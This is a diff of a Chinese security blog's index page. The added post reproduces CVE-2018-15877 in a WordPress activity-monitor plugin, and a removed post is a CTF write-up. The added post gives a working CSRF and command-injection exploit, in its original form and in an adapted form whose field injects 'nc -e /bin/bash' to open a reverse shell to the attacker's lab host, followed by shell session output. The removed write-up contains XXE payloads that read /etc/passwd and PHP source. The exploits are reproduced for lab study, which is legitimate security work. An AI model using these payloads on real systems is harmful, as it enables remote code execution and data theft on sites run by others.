@@ -134,6 +134,104 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CVE-2018-15877 复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/09/26/CVE-2018-15877 复现/">CVE-2018-15877 复现</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/09/26/CVE-2018-15877 复现/" class="archive-article-date">
+  	<time datetime="2019-09-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞类型：远程命令执行漏洞</p>
+<p>WordPress框架当中的Activity monitor插件引起的漏洞</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
+<p>攻击机：Kali（IP：192.168.43.22）</p>
+<p>靶机：Debian GNU/Liux 9（IP：192.168.43.84）</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>拿到管理员账号进入后台之后，点击<code>Activity monitor -&gt; Tools</code>，输入参数后点击<code>Lookup</code>提交抓包</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/15877-1.png" alt="15877-1"></p>
+<p>修改<code>ip</code>参数，没有任何过滤地命令执行</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/15877-2.png" alt="15877-2"></p>
+<p>直接拿shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.43.84] from (UNKNOWN) [192.168.43.22] 58488</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/sh&apos;)&quot;</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/15877-3.png" alt="15877-3"></p>
+<hr>
+<p>也可以利用<code>searchsploit</code>拿别人写好的<code>POC</code></p>
+<p><code>searchsploit</code>搜索关键词<code>wordpress activity monitor</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/~# searchsploit wordpress activity monitor</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                   	       |  Path</span><br><span class="line">                                	       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Plainview ...			   | exploits/php/webapps/45274.html</span><br><span class="line">------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@Knlvre:/~# searchsploit -m exploits/php/webapps/45274.html</span><br><span class="line">  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45274</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html</span><br><span class="line">File Type: HTML document, ASCII text, with CRLF line terminators</span><br><span class="line">Copied to: /var/www/html/45274.html</span><br></pre></td></tr></table></figure>
+<p>查看<code>45274.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:/~# cat 45274.html </span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">About:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">Component: Plainview Activity Monitor (Wordpress plugin)</span></span><br><span class="line"><span class="comment">Vulnerable version: 20161228 and possibly prior</span></span><br><span class="line"><span class="comment">Fixed version: 20180826</span></span><br><span class="line"><span class="comment">CVE-ID: CVE-2018-15877</span></span><br><span class="line"><span class="comment">CWE-ID: CWE-78</span></span><br><span class="line"><span class="comment">Author:</span></span><br><span class="line"><span class="comment">- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Timeline:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">- 2018/08/25: Vulnerability found</span></span><br><span class="line"><span class="comment">- 2018/08/25: CVE-ID request</span></span><br><span class="line"><span class="comment">- 2018/08/26: Reported to developer</span></span><br><span class="line"><span class="comment">- 2018/08/26: Fixed version</span></span><br><span class="line"><span class="comment">- 2018/08/26: Advisory published on GitHub</span></span><br><span class="line"><span class="comment">- 2018/08/26: Advisory sent to bugtraq mailing list</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Description:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">Plainview Activity Monitor Wordpress plugin is vulnerable to OS</span></span><br><span class="line"><span class="comment">command injection which allows an attacker to remotely execute</span></span><br><span class="line"><span class="comment">commands on underlying system. Application passes unsafe user supplied</span></span><br><span class="line"><span class="comment">data to ip parameter into activities_overview.php.</span></span><br><span class="line"><span class="comment">Privileges are required in order to exploit this vulnerability, but</span></span><br><span class="line"><span class="comment">this plugin version is also vulnerable to CSRF attack and Reflected</span></span><br><span class="line"><span class="comment">XSS. Combined, these three vulnerabilities can lead to Remote Command</span></span><br><span class="line"><span class="comment">Execution just with an admin click on a malicious link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">References:</span></span><br><span class="line"><span class="comment">===========</span></span><br><span class="line"><span class="comment">https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PoC:</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  Wordpress Plainview Activity Monitor RCE</span></span><br><span class="line"><span class="comment">        [+] Version: 20161228 and possibly prior</span></span><br><span class="line"><span class="comment">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span></span><br><span class="line"><span class="comment">        [+] Author: LydA(c)ric LEFEBVRE</span></span><br><span class="line"><span class="comment">        [+] CVE-ID: CVE-2018-15877</span></span><br><span class="line"><span class="comment">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span></span><br><span class="line"><span class="comment">        [+] <span class="doctag">Note:</span> Many reflected XSS exists on this plugin and can be combine with this exploit as well</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"ip"</span> <span class="attr">value</span>=<span class="string">"google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"lookup"</span> <span class="attr">value</span>=<span class="string">"Lookup"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据提示，我们修改部分内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"ip"</span> <span class="attr">value</span>=<span class="string">"google.fr| nc -e /bin/bash 192.168.199.133 3737"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"lookup"</span> <span class="attr">value</span>=<span class="string">"Lookup"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>然后现在攻击机这段开启端口监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br></pre></td></tr></table></figure>
+<p>再去访问<code>http://127.0.0.1/45274.html</code>，点击<code>Submit request</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/6-2.png" alt="6-2"></p>
+<p>返回shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.199.133] from (UNKNOWN) [192.168.199.107] 53980</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/26/CVE-2018-15877 复现/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-MS17-010（CVE-2017-0143）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2053,156 +2151,9 @@
 
 
   
-    <article id="post-CTF比赛—2019网络与信息安全领域专项赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/">2019网络与信息安全领域专项赛 — 线上赛WriteUp</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/" class="archive-article-date">
-  	<time datetime="2019-08-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没报名比赛，用同学的账号做一下题目</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Game"><a href="#1-Game" class="headerlink" title="1. Game"></a>1. Game</h2><p>题目进去是一个游戏机，只有<code>Shuffle</code>和<code>Stop</code>两个按钮可以点击，没什么作用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-1.png" alt="6-1"></p>
-<p>查看源码，其他没什么用，但是发现一个<code>js文件（cqg.js）</code>，点击查看源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-2.png" alt="6-2"></p>
-<p>在末尾发现了关键代码</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score == <span class="number">15</span>)&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'score.php'</span>,</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        data: <span class="string">'score='</span>+score,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = data;</span><br><span class="line">            $(<span class="string">"#output"</span>).text(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
-<p>直接访问<code>score.php</code>，抓包修改为<code>POST</code>方式，提交<code>score=15</code>，直接拿到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-3.png" alt="6-3"></p>
-<h2 id="2-who-are-you"><a href="#2-who-are-you" class="headerlink" title="2. who_are_you?"></a>2. who_are_you?</h2><p>本题考察XXE漏洞的利用，参考文章：<a href="https://blog.csdn.net/weixin_39997829/article/details/79654861" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39997829/article/details/79654861</a></p>
-<p><strong>Q1</strong>：什么是XXE漏洞？</p>
-<p><strong>A1</strong>：XML外部实体（XML External Entity），XXE漏洞一般称为xml外部实体攻击漏洞</p>
-<p>.</p>
-<p><strong>Q2</strong>：xml语言是什么？</p>
-<p><strong>A2</strong>：XML百度的解释：可扩展<a href="https://baike.baidu.com/item/标记语言" target="_blank" rel="noopener">标记语言</a>，<a href="https://baike.baidu.com/item/标准通用标记语言" target="_blank" rel="noopener">标准通用标记语言</a>的子集，是一种用于标记电子文件使其具有结构性的标记语言</p>
-<p>下面的例子中，<code>username</code>、<code>password</code>、<code>address</code>被称为xml的元素</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1..0"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>yyy<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>zzz<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有些XML文档包含system标识符定义的<code>实体</code>，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的<code>实体</code>能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了<code>XML实体</code></p>
-<p>这一段代码，其中<code>Entity</code>就是外部实体，我们可以通过这个参数来访问<code>file://etc/passwd</code>的内容，因为我们web服务器在解析xml文档的过程中，实体<code>Entity</code>的值会直接被替换成file://etc/passwd。关键字<code>SYSTEM</code>会告诉XML解析器，Entity的实体值将会从后面的URL获取，也就是我们所替换的file:///etc/passwd文件，其实这个过程就是XML实体攻击过程</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE what_ever[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY Entity SYSTEM "file://etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feedback</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;Entity;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;/<span class="name">feedback</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>.</p>
-<p><strong>Q3</strong>：怎么识别存在xml外部实体攻击漏洞（XXE）？</p>
-<p><strong>A3</strong>：最快速的方法就是通过burpsuit抓取关键的包，如果包中存在xml实体，并且服务器端如果解析了这个实体，那么就很可能存在XXE漏洞，接下来就按本道题来做个例子</p>
-<p>首先我们在输入框内填入：<code>&quot;XXE_Entity_Test&quot;</code>，点击<code>Submit</code>，抓下这个包</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-1.png" alt="5-1"></p>
-<p>可以看到该包POST的内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;XXE_Entity_Test&lt;/author&gt;&lt;/feedback&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-2.png" alt="5-2"></p>
-<p>发现了xml外部实体（即XXE_Entity_Test），点击Go，在Response中我们可以确认web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-3.png" alt="5-3"></p>
-<p>为了验证，我们将实体改为<code>XXE_Entity_Test_2</code>，可以看到返回结果随着我们的改变而改变</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-4.png" alt="5-4"></p>
-<p>可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容，并且这个参数是可控的？在构造这个参数之前，我们需要知道这个实体的名称，方法就是查看源代码。如本题，实体名称为<code>name</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-5.png" alt="5-5"></p>
-<p>知道实体名称后，就可以构造参数了（php://filter/read=convert.base64-encode/resource=index.php），直接通过<code>php伪协议</code>去读取<code>index.php</code>的源代码</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE what_ever[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY name SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feedback</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;/<span class="name">feedback</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-6.png" alt="5-6"></p>
-<p>Base64解码之后，直接在源码中看到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-7.png" alt="5-7"></p>
-<p><code>flag{26a4b2cb-28c3-42f5-81a9-faafda680763}</code></p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>一共4道题目</p>
-<p>考查知识点有：DNS查询、GIF帧分析、图片通道、社会主义核心价值观编码、Ook!编码</p>
-<h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1. 签到题"></a>1. 签到题</h2><p>只给出<code>I&#39;m gamectf.com, I love TXT.</code>的提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/1-1.png" alt="1-1"></p>
-<p>是<code>DNS查询题目</code>，到这个网站跑一下就出来了：<a href="https://dnslookup.online/txt.html" target="_blank" rel="noopener">https://dnslookup.online/txt.html</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/1-2.png" alt="1-2"></p>
-<p><code>flag{welcome_TXT}</code></p>
-<h2 id="2-七代目"><a href="#2-七代目" class="headerlink" title="2. 七代目"></a>2. 七代目</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压出来<code>七代目.gif</code>，但是图片打不开，用<code>Winhex</code>查看发现文件头错误（将原本的<code>89504e47</code>改为<code>47494638</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-1.png" alt="2-1"></p>
-<p>用图片浏览器打开时发现图片并没有动。打开<code>Kali</code>，使用命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%s %T \n&quot; 七代目.gif</span><br></pre></td></tr></table></figure>
-<p>发现图片中第7帧的间隙与其他的不同，再结合题目名称——七代目，这个第7帧应该有问题</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-2.png" alt="2-2"></p>
-<p>Stegsolve保存第7帧并打开，将通道切换至<code>Colour Inversion(Xor)</code>，直接看到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-3.png" alt="2-3"></p>
-<p><code>flag{49bdbe-able-47-9f66-a533331e6}</code></p>
-<h2 id="3-亚萨西"><a href="#3-亚萨西" class="headerlink" title="3. 亚萨西"></a>3. 亚萨西</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压时需要密码。刚开始以为是伪加密，后来发现不是。在文件末尾发现了解压密码<code>loli</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-1.png" alt="3-1"></p>
